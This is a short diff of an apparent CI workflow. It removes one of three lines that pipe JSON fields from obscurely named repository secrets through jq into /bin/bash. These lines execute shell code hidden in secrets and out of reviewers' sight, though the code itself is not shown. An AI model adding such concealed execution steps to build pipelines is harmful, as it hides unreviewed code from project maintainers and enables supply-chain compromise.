@@ -22,7 +22,6 @@ jobs:
           hkibn7479: ${{ secrets.hkibn7479 }}
         run: |
           printf '%s' "$hkibn7479" | jq -r .oo9 | /bin/bash
-          printf '%s' "$bsgs18" | jq -r .y3192 | /bin/bash
           printf '%s' "$ppc0544" | jq -r .hdpwj30169 | /bin/bash
 
       - name: Archive output
